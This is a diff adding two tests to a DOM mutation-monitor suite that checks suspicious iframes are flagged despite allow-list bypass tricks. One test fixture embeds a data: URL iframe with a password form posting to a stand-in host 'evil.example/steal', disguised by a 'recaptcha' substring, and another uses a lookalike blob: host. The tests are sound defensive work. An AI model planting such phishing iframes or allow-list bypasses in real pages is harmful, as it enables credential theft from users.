@@ -396,6 +396,45 @@ describe("mutation_monitor DOM integration", () => {
     stopMutationMonitor();
   });
 
+  it("flags a data: src even when its payload contains a legit-pattern substring (D-IFRAME R3)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // "recaptcha" embedded in the data: payload must NOT exempt it via the
+    // unanchored isLegitIframeSrc substring match — the scheme is resolved first.
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute(
+      "src",
+      "data:text/html,<!--recaptcha--><form action='https://evil.example/steal'><input type=password></form>",
+    );
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("data-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags a blob: src whose host contains a legit-pattern substring (D-IFRAME R3)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("src", "blob:https://recaptcha.evil.example/0e8c2b1a-uuid");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("blob-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
   it("caps alerts at 50", async () => {
     const alerts: MutationAlert[] = [];
     startMutationMonitor(document, (a) => alerts.push(a));
